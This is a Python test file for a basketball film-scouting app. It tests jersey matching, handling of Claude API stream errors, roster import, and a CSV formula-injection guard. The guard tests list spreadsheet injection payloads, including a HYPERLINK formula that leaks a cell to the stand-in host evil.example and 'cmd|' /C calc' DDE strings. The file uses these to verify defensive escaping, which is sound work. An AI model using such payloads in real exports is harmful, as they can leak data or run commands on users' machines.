"""Regression tests from the review of the outputs area: jersey matching on real film,
the Claude report's stream handling, FastScout CSV / config safety and roster import.
"""

from __future__ import annotations

import json
from typing import Any

import anthropic
import httpx2
import pytest

from scout.errors import ErrorCode, ScoutError
from scout.export import fastscout
from scout.reporting import claude_report
from scout.reporting.prompts import DATA_GUIDE
from scout.roster.importer import parse_roster_file
from scout.roster.matcher import assign_tracks
from scout.schemas import (
    JerseyRead,
    PipelineWarning,
    Play,
    PlayType,
    Roster,
    RosterPlayer,
    ShootingSplit,
    TeamSide,
    Track,
    TrackSample,
    ZoneSplits,
)
from tests import helpers
from tests.test_export_fastscout import make_analysis, make_roster
from tests.test_reporting import (
    REPORT_JSON,
    FakeClient,
    _sdk_client,
    _sse_response,
    make_message,
    status_error,
)

S, O = TeamSide.SCOUTED, TeamSide.OTHER

# ---------------------------------------------------------------------------
# Jersey matching
# ---------------------------------------------------------------------------


def _roster(side: TeamSide, *jerseys: str) -> Roster:
    players = [RosterPlayer(id=f"{side.value}-{j}", jersey=j, first_name="Player", last_name=j) for j in jerseys]
    return Roster(game_id="g_test", side=side, players=players)


def _track(track_id: int, team_id: int, stretches: list[tuple[int, int]], reads: list[str]) -> Track:
    """A track on screen during ``stretches`` (inclusive frame ranges, a sample every 3 frames)."""
    frames = [f for start, end in stretches for f in range(start, end + 1, 3)]
    samples = [TrackSample(f=f, bbox=(0.0, 0.0, 10.0, 60.0)) for f in frames]
    jersey_reads = [JerseyRead(frame=frames[i], text=text, conf=0.9) for i, text in enumerate(reads)]
    return Track(track_id=track_id, team_id=team_id, jersey_reads=jersey_reads, samples=samples)


def _assign(tracks: list[Track], rosters: dict[TeamSide, Roster]) -> dict[int, Any]:
    return {a.track_id: a for a in assign_tracks(helpers.tracking(tracks), {0: S, 1: O}, rosters)}


def test_reid_track_with_long_absences_does_not_block_the_same_player():
    # OHV keys tracks by its ReID player id, so one id spans the game with the player on the
    # bench in between. A second id for the same player while the first is off screen is the
    # same player, not a conflict (the old check compared first-to-last frame spans).
    rosters = {S: _roster(S, "23", "28"), O: _roster(O)}
    first_id = _track(1, 0, [(0, 900), (5400, 6300)], ["23"] * 4)
    second_id = _track(2, 0, [(1800, 4500)], ["23"] * 4)
    result = _assign([first_id, second_id], rosters)
    assert (result[1].player_id, result[2].player_id) == ("scouted-23", "scouted-23")


def test_tracks_on_screen_together_still_cannot_share_a_player():
    rosters = {S: _roster(S, "23"), O: _roster(O)}
    with_gap = _track(1, 0, [(0, 900), (5400, 6300)], ["23"] * 4)
    during_second_stretch = _track(2, 0, [(5000, 6000)], ["23"] * 2)
    result = _assign([with_gap, during_second_stretch], rosters)
    assert sorted(str(result[i].player_id) for i in (1, 2)) == ["None", "scouted-23"]


def test_fallback_guess_does_not_take_a_player_from_a_track_that_read_his_number():
    # A (#3) and B are on the floor all half; C reads "8" cleanly while B is on the floor.
    # B reads mostly "3", which A already has; its 3/8-confusion fallback must not take #8
    # from C, whose reads are exactly 8.
    rosters = {S: _roster(S, "3", "8"), O: _roster(O)}
    a = _track(1, 0, [(0, 3000)], ["3"] * 10)
    b = _track(2, 0, [(0, 3000)], ["3"] * 6 + ["8"] * 2)
    c = _track(3, 0, [(1000, 1600)], ["8"] * 5)
    result = _assign([a, b, c], rosters)
    assert result[1].player_id == "scouted-3"
    assert (result[3].player_id, result[3].method) == ("scouted-8", "exact")
    # No jersey for B: "3" is A's roster number, and a second "#3" line would be a player who does not exist.
    assert (result[2].player_id, result[2].method, result[2].jersey, result[2].best_read) == (
        None, "unrostered", None, "3",
    )  # fmt: skip


# ---------------------------------------------------------------------------
# Claude report: stop reasons and broken streams
# ---------------------------------------------------------------------------


@pytest.fixture
def analysis():
    return make_analysis()


@pytest.fixture
def rosters(game):
    return {S: make_roster(game.id)}


def _report_error(analysis, game, rosters, settings, client) -> ScoutError:
    with pytest.raises(ScoutError) as err:
        claude_report.generate_report(analysis, game, rosters, settings=settings, client=client)
    return err.value


def _sse(events: list[dict[str, Any]]) -> bytes:
    return "".join(f"event: {e['type']}\ndata: {json.dumps(e)}\n\n" for e in events).encode()


def _partial_stream_events(text: str) -> list[dict[str, Any]]:
    """A streamed answer cut off after some report text (no message_delta / message_stop)."""
    start = {
        "id": "msg_1", "type": "message", "role": "assistant", "model": "claude-opus-5-5", "content": [],
        "stop_reason": None, "stop_sequence": None, "usage": {"input_tokens": 900, "output_tokens": 1},
    }  # fmt: skip
    return [
        {"type": "message_start", "message": start},
        {"type": "content_block_start", "index": 0, "content_block": {"type": "text", "text": ""}},
        {"type": "content_block_delta", "index": 0, "delta": {"type": "text_delta", "text": text}},
    ]


class _BrokenStream(httpx2.SyncByteStream):
    """Sends some SSE bytes, then the connection fails."""

    def __init__(self, first: bytes, exc: Exception) -> None:
        self.first, self.exc = first, exc

    def __iter__(self):
        yield self.first
        raise self.exc


def _event_stream(**kwargs: Any) -> httpx2.Response:
    return httpx2.Response(200, headers={"content-type": "text/event-stream"}, **kwargs)


def test_stream_that_closes_early_is_reported_as_cut_off(analysis, game, rosters, settings):
    client, _ = _sdk_client(_event_stream(content=_sse(_partial_stream_events(REPORT_JSON[:300]))))
    error = _report_error(analysis, game, rosters, settings, client)
    assert error.code == ErrorCode.REPORT_FAILED and error.retryable
    assert "closed before the report was finished" in error.message


@pytest.mark.parametrize(
    ("exc", "text"),
    [
        (httpx2.ReadError("connection reset by peer"), "connection to the Anthropic API dropped"),
        (httpx2.RemoteProtocolError("peer closed connection"), "connection to the Anthropic API dropped"),
        (httpx2.ReadTimeout("timed out"), "timed out"),
    ],
    ids=["read-error", "protocol-error", "read-timeout"],
)
def test_network_failure_mid_stream_is_a_report_error(analysis, game, rosters, settings, exc, text):
    # The SDK only wraps errors raised while sending; a connection that breaks while the
    # stream is being read surfaces as a raw httpx2 exception.
    first = _sse(_partial_stream_events(REPORT_JSON[:120]))
    client, _ = _sdk_client(_event_stream(stream=_BrokenStream(first, exc)))
    error = _report_error(analysis, game, rosters, settings, client)
    assert error.code == ErrorCode.REPORT_FAILED and error.retryable
    assert text in error.message
    assert error.__cause__ is exc


def test_context_window_stop_is_truncation(analysis, game, rosters, settings):
    message = make_message(REPORT_JSON[:200], stop_reason="model_context_window_exceeded")
    error = _report_error(analysis, game, rosters, settings, FakeClient(message))
    assert error.code == ErrorCode.REPORT_TRUNCATED
    assert "context window" in error.message and "SCOUT_CLAUDE_MAX_TOKENS" not in (error.hint or "")


@pytest.mark.parametrize("stop_reason", ["pause_turn", "tool_use", "compaction"])
def test_other_unfinished_stop_reasons_are_not_read_as_a_report(analysis, game, rosters, settings, stop_reason):
    error = _report_error(analysis, game, rosters, settings, FakeClient(make_message(stop_reason=stop_reason)))
    assert error.code == ErrorCode.REPORT_FAILED and stop_reason in error.message


def test_billing_error_says_so_and_is_not_retryable(analysis, game, rosters, settings):
    billing = status_error(anthropic.APIStatusError, 402, "billing_error", "Your credit balance is too low.")
    error = _report_error(analysis, game, rosters, settings, FakeClient(billing))
    assert error.code == ErrorCode.REPORT_FAILED and not error.retryable
    assert "billing" in error.message.lower() and "billing" in (error.hint or "")
    assert error.__cause__ is billing


def test_complete_stream_is_still_accepted(analysis, game, rosters, settings):
    client, _ = _sdk_client(_sse_response(REPORT_JSON))
    record = claude_report.generate_report(analysis, game, rosters, settings=settings, client=client)
    assert record.stop_reason == "end_turn" and record.report.headline


# ---------------------------------------------------------------------------
# FastScout CSV formula guard
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "value",
    [
        "-1+HYPERLINK(\"http://evil.example/?\"&A1,\"x\")",
        "+1|cmd' /C calc'!A0",
        "-2+3+cmd|' /C calc'!A0",
        "+.5+IMPORTXML(A1)",
        "=SUM(A1:A9)",
        "@SUM(A1)",
        "-",
    ],
)
def test_formula_guard_neutralises_signed_formulas(value):
    assert fastscout._safe_cell(value) == f"'{value}"


@pytest.mark.parametrize("value", ["-3", "+5", "0", "-0.5", "12.0", "45.5%", "5-11", "2-3 (6), 1-3-1 (2)", "#3 Ty"])
def test_formula_guard_leaves_numbers_and_text_alone(value):
    assert fastscout._safe_cell(value) == value


def test_box_csv_neutralises_a_formula_in_an_imported_name(analysis, game):
    roster = make_roster(game.id)
    roster.players[0] = roster.players[0].model_copy(update={"first_name": "-2+3+cmd|' /C calc'!A0", "last_name": ""})
    text = fastscout.build_custom_table_csv(analysis, game, roster=roster)
    row = next(line for line in text.split("\r\n") if line.startswith("3,"))
    assert row.startswith("3,'-2+3+cmd|' /C calc'!A0,22,")


def test_timeline_csv_guards_team_names_in_its_header(analysis):
    analysis.teams[0].name = "=HYPERLINK(\"http://evil.example\")"
    header = fastscout.build_timeline_csv(analysis).split("\r\n")[0]
    assert '"\'=HYPERLINK(""http://evil.example"") Score",Rival HS Score,' in header


def test_plus_minus_column_keeps_its_signs(analysis, game):
    analysis.box_scores[0].players[1].plus_minus = -4
    analysis.box_scores[0].players[2].plus_minus = 6
    config = {"custom_tables": {"t": {"columns": [{"header": "+/-", "field": "plus_minus"}]}}, "csv": {"default_table": "t"}}
    rows = fastscout.build_custom_table_csv(analysis, game, config=config, roster=make_roster(game.id)).split("\r\n")
    assert rows[0] == "+/-" and "-4" in rows and "+6" in rows


# ---------------------------------------------------------------------------
# FastScout config file
# ---------------------------------------------------------------------------


def test_unreadable_config_path_is_config_invalid(tmp_path):
    folder = tmp_path / "fastscout_columns.yaml"
    folder.mkdir()  # e.g. a bad SCOUT_FASTSCOUT_CONFIG, or a file the server may not read
    with pytest.raises(ScoutError) as err:
        fastscout.load_fastscout_config(folder)
    assert err.value.code == ErrorCode.CONFIG_INVALID and "could not be read" in err.value.message


def test_section_with_every_setting_commented_out_uses_the_defaults(tmp_path):
    path = tmp_path / "fastscout_columns.yaml"
    path.write_text("paste_block:\n  # delimiter: tab\ncsv:\nplay_labels:\n", encoding="utf-8")
    assert fastscout.load_fastscout_config(path) == fastscout.validate_fastscout_config({})


# ---------------------------------------------------------------------------
# Team numbers block
# ---------------------------------------------------------------------------


def test_points_in_the_paint_is_unknown_when_no_shot_has_a_location(analysis):
    # Film without a court mapping: every shot zone is "unknown", so "0" would be wrong.
    box = analysis.box_scores[0]
    box.totals.zones = ZoneSplits(unknown=ShootingSplit(made=11, attempts=24))
    lines = fastscout.team_helper_block(analysis, S).splitlines()
    assert "Points in the paint: unknown (no shot had a court location - map the court to get this number)" in lines


def test_points_in_the_paint_without_shots_is_zero(analysis):
    analysis.box_scores[0].totals.zones = ZoneSplits()
    assert "Points in the paint: 0" in fastscout.team_helper_block(analysis, S).splitlines()


def test_points_in_the_paint_with_some_unplaced_shots_is_approximate(analysis):
    lines = fastscout.team_helper_block(analysis, S).splitlines()
    assert "Points in the paint: 10 (approximate: 1 made shot had no court location)" in lines


# ---------------------------------------------------------------------------
# Roster import
# ---------------------------------------------------------------------------


def test_excel_text_formula_cells_keep_leading_zeros():
    # Some exports write ="05" so Excel keeps the leading zero; "0" and "00" stay different.
    content = b'#,Name,Pos\n="05",Tyrell Williams,G\n="00",Andre Smith,F\n="0",Eli Grant,="C"\n'
    players = parse_roster_file("roster.csv", content).players
    assert [(p.jersey, p.name, p.position) for p in players] == [
        ("05", "Tyrell Williams", "G"),
        ("00", "Andre Smith", "F"),
        ("0", "Eli Grant", "C"),
    ]


# ---------------------------------------------------------------------------
# Second review: answers that are not from Claude, logged details, long films,
# partly analysed films
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "response",
    [
        httpx2.Response(200, headers={"content-type": "text/html"}, content=b"<html>This site is blocked</html>"),
        _event_stream(content=b""),
    ],
    ids=["web-filter-page", "empty-stream"],
)
def test_answer_without_a_message_is_a_report_error(analysis, game, rosters, settings, response):
    # A school web filter or proxy can answer 200 with its own page; the SDK then fails an
    # internal assertion, which used to reach the coach as "Unexpected error".
    client, _ = _sdk_client(response)
    error = _report_error(analysis, game, rosters, settings, client)
    assert error.code == ErrorCode.REPORT_FAILED and error.retryable
    assert "web filter or proxy" in error.message and "api.anthropic.com" in (error.hint or "")
    assert response.headers["content-type"] in (error.detail or "")


def test_report_format_error_detail_does_not_quote_the_answer(analysis, game, rosters, settings):
    # The detail is logged when a report job fails; the answer's text names players (minors).
    answer = json.dumps({"headline": "Keep #23 Jordan Smith off the glass", "key_players": [{"jersey": "23"}]})
    error = _report_error(analysis, game, rosters, settings, FakeClient(make_message(answer)))
    assert error.code == ErrorCode.REPORT_FAILED and "did not match the report format" in error.message
    assert "Jordan Smith" not in (error.detail or "") and "#23" not in (error.detail or "")
    assert "offensive_identity: Field required" in error.detail and "key_players.0.role: Field required" in error.detail


def test_report_format_error_detail_for_broken_json_does_not_quote_it(analysis, game, rosters, settings):
    error = _report_error(analysis, game, rosters, settings, FakeClient(make_message('{"headline": "#23 Jordan Smith')))
    assert error.code == ErrorCode.REPORT_FAILED and "Invalid JSON" in (error.detail or "")
    assert "Jordan" not in (error.detail or "")


def test_play_log_of_a_long_film_covers_the_whole_film(analysis, game, rosters):
    # 200 scouted plays over a 60-minute film: the log used to stop at the 150th play (about
    # 45 minutes in), so the model saw no plays in the last quarter of the film.
    analysis.video = helpers.video_info(duration_s=3600.0)
    analysis.plays = [
        Play(
            id=f"pl_{i:03d}", type=PlayType.SPOT_UP, category="offense", side=S, start_t=18.0 * i,
            end_t=18.0 * i + 5, start_frame=540 * i, end_frame=540 * i + 150,
        )  # fmt: skip
        for i in range(200)
    ]
    log = claude_report.build_report_payload(analysis, game, rosters)["play_log"]
    assert len(log) == claude_report._PLAY_LOG_LIMIT
    assert log[0]["t"] == "00:00" and log[-1]["t"] >= "59:00"
    assert "evenly spaced selection" in DATA_GUIDE


def test_invisible_characters_from_a_web_page_do_not_drop_players():
    # Rosters copied from a web page can carry zero-width spaces (and stray byte-order marks):
    # the cell looks like "5" but used to be rejected as "not a jersey number".
    content = "\ufeffJersey,Player\n\u200b5,Al Smith\n23\u200b,Mike\u200d Jones\n\u2060\ufeff00,Eli Grant\n".encode()
    result = parse_roster_file("roster.csv", content)
    assert [(p.jersey, p.name) for p in result.players] == [("5", "Al Smith"), ("23", "Mike Jones"), ("00", "Eli Grant")]
    assert not result.skipped_rows and not result.warnings


def _partly_analysed(analysis):
    message = (
        "Only the first 23:10 of the 52:00 film could be analysed (the rest could not be read), "
        "so stats and plays cover that part only."
    )
    analysis.data_quality.warnings.append(PipelineWarning(code="FILM_PARTIALLY_ANALYSED", message=message))
    return analysis


def test_partly_analysed_film_is_flagged_before_pasting(analysis, game):
    # Pasting a part-game box score as the game would put wrong numbers into FastScout's season stats.
    warnings = fastscout.paste_block_warnings(_partly_analysed(analysis), game, roster=make_roster(game.id))
    assert warnings[0].startswith("Not the whole game: Only the first 23:10 of the 52:00 film could be analysed")


def test_partly_analysed_film_is_flagged_in_the_team_numbers(analysis):
    lines = fastscout.team_helper_block(_partly_analysed(analysis), S).splitlines()
    assert lines[-2].startswith("Not the whole game: Only the first 23:10") and lines[1].startswith("Final score:")


def test_whole_film_has_no_partial_film_note(analysis, game):
    warnings = fastscout.paste_block_warnings(analysis, game, roster=make_roster(game.id))
    assert not any("Not the whole game" in w for w in warnings)
    assert "Not the whole game" not in fastscout.team_helper_block(analysis, S)
